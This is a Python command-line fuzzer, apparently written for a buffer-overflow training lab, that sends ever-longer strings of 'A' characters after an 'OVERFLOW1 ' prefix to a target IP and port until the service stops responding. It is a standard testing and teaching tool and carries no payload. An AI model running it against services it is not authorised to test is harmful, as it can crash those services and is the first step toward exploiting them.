#!/usr/bin/env python3

import socket
import time
import sys
import argparse

def fuzz_target(ip: str, port: int, prefix: str, timeout: int = 5, 
                initial_payload_size: int = 100, increment_size: int = 100):
    """
    Perform fuzzing on a remote service.

    Args:
    ip (str): Target IP address
    port (int): Target port number
    prefix (str): Prefix to be added before the payload
    timeout (int): Socket timeout in seconds
    initial_payload_size (int): Initial size of the payload
    increment_size (int): Size to increment the payload by in each iteration

    This function incrementally sends larger payloads to a specified IP and port
    to identify the payload size that causes the service to crash.
    """
    payload_size = initial_payload_size

    while True:
        payload = prefix + "A" * payload_size
        print(f"Fuzzing with {payload_size} bytes")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                
                s.send(payload.encode("latin-1"))
                s.recv(1024)
        except socket.timeout:
            print(f"Connection timed out at {payload_size} bytes")
            return
        except ConnectionRefusedError:
            print(f"Connection refused. Check if the server is running and the IP/port are correct.")
            return
        except Exception as e:
            print(f"Fuzzing crashed at {payload_size} bytes")
            print(f"Error: {e}")
            return

        payload_size += increment_size
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="Fuzz a remote service to find buffer overflow vulnerabilities.")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, required=True, help="Target port number")
    parser.add_argument("--prefix", default="OVERFLOW1 ", help="Prefix to be added before the payload")
    parser.add_argument("--timeout", type=int, default=5, help="Socket timeout in seconds")
    parser.add_argument("--initial-size", type=int, default=100, help="Initial size of the payload")
    parser.add_argument("--increment", type=int, default=100, help="Size to increment the payload by in each iteration")

    args = parser.parse_args()

    fuzz_target(args.ip, args.port, args.prefix, args.timeout, args.initial_size, args.increment)

if __name__ == "__main__":
    main()